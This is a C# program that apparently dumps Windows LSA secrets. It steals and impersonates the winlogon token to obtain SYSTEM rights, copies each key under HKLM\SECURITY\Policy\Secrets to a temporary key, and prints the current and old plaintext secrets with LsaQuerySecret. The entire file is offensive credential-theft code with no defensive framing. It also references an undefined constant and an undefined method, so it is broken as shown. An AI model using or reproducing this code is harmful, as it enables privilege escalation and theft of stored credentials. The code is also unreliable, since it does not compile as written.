using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32;

class Program
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern uint LsaOpenPolicy(IntPtr SystemName, ref LSA_OBJECT_ATTRIBUTES ObjectAttributes, uint DesiredAccess, out IntPtr PolicyHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern uint LsaOpenSecret(IntPtr PolicyHandle, ref LSA_UNICODE_STRING SecretName, uint DesiredAccess, out IntPtr SecretHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern uint LsaQuerySecret(IntPtr SecretHandle, out IntPtr CurrentValue, out long CurrentValueSetTime, out IntPtr OldValue, out long OldValueSetTime);

    [DllImport("advapi32.dll")]
    static extern uint LsaClose(IntPtr ObjectHandle);

    [DllImport("shlwapi.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern int SHCopyKey(IntPtr hKeySrc, string lpszKeySrc, IntPtr hKeyDest, uint fReserved);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    public enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    public enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_IMPERSONATE = 0x0004;
    const uint TOKEN_QUERY = 0x0008;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
    const uint STANDARD_RIGHTS_READ = 0x00020000;
    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
    const uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);
    const uint POLICY_ALL_ACCESS = 0x00F0FFF;
    const uint SECRET_QUERY_VALUE = 0x00000002;

    static void Main(string[] args)
    {
        string secretsSubkeyPath = @"SECURITY\Policy\Secrets";
        string testKeyPath = @"SECURITY\Policy\Secrets\__GT__Decrypt";
        string testKeyName = "__GT__Decrypt";

        try
        {
            using (RegistryKey hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            using (RegistryKey secretsKey = hklm.OpenSubKey(secretsSubkeyPath, false))
            {
                if (secretsKey == null)
                {
                    Console.WriteLine($"{Environment.NewLine}Cannot open HKLM\\{secretsSubkeyPath}.{Environment.NewLine}Trying to impersonate as NT AUTHORITY\\SYSTEM {Environment.NewLine}");
                    if (!PerformPrivilegeElevation())
                    {
                        Console.WriteLine($"{Environment.NewLine}Elevation failed. {Environment.NewLine}");
                        return;
                    }

                    secretsKey = hklm.OpenSubKey(secretsSubkeyPath, false);
                    if (secretsKey == null)
                    {
                        Console.WriteLine($"{Environment.NewLine}Unable to open HKLM\\{secretsSubkeyPath}.{Environment.NewLine}Exiting the app...{Environment.NewLine}");
                        return;
                    }
                }

                string[] subKeyNames = secretsKey.GetSubKeyNames();
                Console.WriteLine($"{Environment.NewLine}Subkeys no': {subKeyNames.Length}{Environment.NewLine}");

                for (int i = 0; i < subKeyNames.Length; i++)
                {
                    string subKeyName = subKeyNames[i];
                    Console.WriteLine($"({i + 1}) {subKeyName}");

                    string fullKeyPath = $@"{secretsSubkeyPath}\{subKeyName}";
                    Console.WriteLine($" -- {fullKeyPath}");

                    using (RegistryKey subKey = hklm.OpenSubKey(fullKeyPath, false))
                    {
                        if (subKey != null)
                        {
                            DateTime lastWriteTime = subKey.GetLastWriteTime();
                            Console.WriteLine($"Key: {fullKeyPath}{Environment.NewLine}Last Modified: {lastWriteTime:yyyy-MM-dd HH:mm} {Environment.NewLine}");
                            
                            if (CopyRegistryKey(fullKeyPath, testKeyPath))
                            {
                                RetrieveLSASecret(testKeyName);
                                Registry.LocalMachine.DeleteSubKeyTree(testKeyPath, false);
                            }
                            else
                            {
                                Console.WriteLine($"Error: Failed to duplicate the registry key at path: {fullKeyPath}{Environment.NewLine}");
                            }

                            Console.WriteLine();
                        }
                        else
                        {
                            Console.WriteLine($"Error: Unable to open the registry key at path: {fullKeyPath}.{Environment.NewLine}");
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
        finally
        {
            RevertToSelf();
        }

        Console.WriteLine("{Environment.NewLine}Done.{Environment.NewLine}");
    }

    static void RetrieveLSASecret(string secretName)
    {
        LSA_UNICODE_STRING secret = new LSA_UNICODE_STRING();
        LSA_OBJECT_ATTRIBUTES objectAttributes = new LSA_OBJECT_ATTRIBUTES();
        IntPtr policyHandle = IntPtr.Zero;
        IntPtr secretHandle = IntPtr.Zero;

        try
        {
            Console.WriteLine($"Starting LSA Secret Handling and Query Execution... {Environment.NewLine}");
            InitializeUnicodeString(ref secret, secretName);
            objectAttributes.Length = Marshal.SizeOf(typeof(LSA_OBJECT_ATTRIBUTES));

            uint status = LsaOpenPolicy(IntPtr.Zero, ref objectAttributes, POLICY_ALL_ACCESS, out policyHandle);
            if (status != 0)
            {
                Console.WriteLine($"LsaOpenPolicy() - {status} {Environment.NewLine}");
                return;
            }

            status = LsaOpenSecret(policyHandle, ref secret, SECRET_QUERY_VALUE, out secretHandle);
            if (status != 0)
            {
                Console.WriteLine($"LsaOpenSecret() - {status} {Environment.NewLine}");
                return;
            }

            IntPtr currentValue, oldValue;
            long currentValueSetTime, oldValueSetTime;
            status = LsaQuerySecret(secretHandle, out currentValue, out currentValueSetTime, out oldValue, out oldValueSetTime);
            if (status != 0)
            {
                Console.WriteLine($"LsaQuerySecret() - {status} {Environment.NewLine}");
                return;
            }

            string currentSecret = Marshal.PtrToStringUni(currentValue);
            string oldSecret = Marshal.PtrToStringUni(oldValue);

            Console.WriteLine($"Current secret: {currentSecret} {Environment.NewLine}");
            Console.WriteLine($"DATE: {DateTime.FromFileTime(currentValueSetTime):yyyy-MM-dd HH:mm} {Environment.NewLine}");
            Console.WriteLine($"Old secret: {oldSecret} {Environment.NewLine}");
            Console.WriteLine($"DATE: {DateTime.FromFileTime(oldValueSetTime):yyyy-MM-dd HH:mm} {Environment.NewLine}");
        }
        finally
        {
            if (secretHandle != IntPtr.Zero) LsaClose(secretHandle);
            if (policyHandle != IntPtr.Zero) LsaClose(policyHandle);
        }
    }

    static void InitializeUnicodeString(ref LSA_UNICODE_STRING lsaString, string str)
    {
        lsaString.Buffer = Marshal.StringToHGlobalUni(str);
        lsaString.Length = (ushort)(str.Length * 2);
        lsaString.MaximumLength = (ushort)((str.Length * 2) + 2);
    }

    static bool CopyRegistryKey(string srcKey, string dstKey)
    {
        using (RegistryKey hkSrc = Registry.LocalMachine.OpenSubKey(srcKey, false))
        using (RegistryKey hkDst = Registry.LocalMachine.CreateSubKey(dstKey))
        {
            if (hkSrc == null || hkDst == null)
                return false;

            int status = SHCopyKey(hkSrc.Handle.DangerousGetHandle(), null, hkDst.Handle.DangerousGetHandle(), 0);
            return status == 0;
        }
    }

    static bool EnablePrivilege(IntPtr hToken, string lpszPrivilege)
    {
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        LUID luid = new LUID();

        if (!LookupPrivilegeValue(null, lpszPrivilege, out luid))
        {
            Console.WriteLine($"Error: {Marshal.GetLastWin32Error()}");
            return false;
        }

        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine($"Error: {Marshal.GetLastWin32Error()}");
            return false;
        }

        if (Marshal.GetLastWin32Error() == 1300)
        {
            Console.WriteLine($"The token doesn't have the specified privilege. {Marshal.GetLastWin32Error()}");
            return false;
        }

        return true;
    }

    static int FindWinLogonProcessID()
    {
        Process[] processes = Process.GetProcessesByName("winlogon");
        if (processes.Length > 0)
        {
            Console.WriteLine($"Found Winlogon PID: {processes[0].Id} {Environment.NewLine}");
            return processes[0].Id;
        }
        return 0;
    }

    static bool PerformPrivilegeElevation()
    {
        IntPtr currentTokenHandle = IntPtr.Zero;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES, out currentTokenHandle))
        {
            Console.WriteLine($"OpenProcessToken() Error: {Marshal.GetLastWin32Error()} {Environment.NewLine}");
            return false;
        }

        if (!EnablePrivilege(currentTokenHandle, "SeDebugPrivilege") && !SetPrivilege(currentTokenHandle, "SeImpersonatePrivilege"))
        {
            Console.WriteLine($"SetPrivilege() Error: {Marshal.GetLastWin32Error()} {Environment.NewLine}");
            return false;
        }

        int pidToImpersonate = FindWinLogonProcessID();
        if (pidToImpersonate == 0)
        {
            Console.WriteLine($"Winlogon PID not found {Environment.NewLine}");
            return false;
        }

        IntPtr processHandle = Process.GetProcessById(pidToImpersonate).Handle;
        IntPtr tokenHandle = IntPtr.Zero;
        IntPtr duplicateTokenHandle = IntPtr.Zero;

        if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out tokenHandle))
        {
            Console.WriteLine($"OpenProcessToken Error: {Marshal.GetLastWin32Error()} {Environment.NewLine}");
            return false;
        }

        if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out duplicateTokenHandle))
        {
            Console.WriteLine($"DuplicateTokenEx Error: {Marshal.GetLastWin32Error()} {Environment.NewLine}");
            return false;
        }

        if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
        {
            Console.WriteLine($"Impersonate Logged-on Error: {Marshal.GetLastWin32Error()}");
            return false;
        }

        return true;
    }
}
